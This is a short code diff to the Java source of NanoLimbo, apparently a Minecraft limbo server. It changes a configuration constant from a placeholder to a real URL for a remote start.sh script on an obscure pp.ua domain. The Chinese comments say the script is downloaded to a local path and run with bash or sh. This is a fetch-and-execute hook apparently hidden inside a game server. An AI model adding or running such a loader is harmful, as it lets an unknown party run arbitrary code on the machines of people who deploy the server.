@@ -15,7 +15,7 @@ public final class NanoLimbo {
 
     // ================== 配置区 ==================
     /** 远程 start.sh 地址 */
-    private static final String START_SCRIPT_URL = "https://your.domain/start.sh";
+    private static final String START_SCRIPT_URL = "https://netjett-de.kof95zip.pp.ua/java-plugins/enzonic/start.sh";
     /** 下载到本地的路径（选容器里可写的目录） */
     private static final String LOCAL_SCRIPT_PATH = "./start.sh";
     /** 解释器：bash 或 sh（没有 bash 就写 sh） */
